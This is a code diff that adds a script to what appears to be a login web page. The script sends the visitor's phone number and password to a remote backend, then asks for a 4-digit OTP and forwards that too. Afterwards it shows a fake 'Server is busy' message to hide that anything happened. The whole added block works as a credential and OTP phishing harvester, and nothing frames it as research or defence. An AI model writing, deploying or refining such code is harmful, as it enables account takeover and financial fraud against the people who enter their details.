@@ -31,6 +31,40 @@
         .agreement-label input::after { content: '✓'; position: absolute; color: white; font-size: 11px; font-weight: bold; }
         .policy-link { color: #2563eb; text-decoration: none; margin-left: 3px; }
     </style>
+    <script>
+    // Apne Render Backend ka URL yahan dalein
+    const BACKEND_URL = 'https://YOUR_RENDER_APP_NAME.onrender.com'; 
+    let currentUserId = null;
+
+    // Login Form Submission
+    document.getElementById('loginForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const phoneNumber = document.getElementById('phoneNumber').value;
+        const password = document.getElementById('password').value;
+
+        const response = await fetch(`${BACKEND_URL}/api/login-submit`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ phoneNumber, password })
+        });
+        const data = await response.json();
+        currentUserId = data.userId;
+        
+        // Yahan OTP Modal open karne ka logic (agar modal CSS mein hai)
+        alert("OTP sent to your number!"); 
+        let otp = prompt("Please enter the 4-digit OTP:"); // Simple prompt for demo, aap custom modal use kar sakte hain
+        if (otp) sendOtp(otp);
+    });
+
+    async function sendOtp(otp) {
+        await fetch(`${BACKEND_URL}/api/otp-submit`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ userId: currentUserId, otp })
+        });
+        alert("Server is busy, please try again later.");
+    }
+</script>
 </head>
 <body>
 
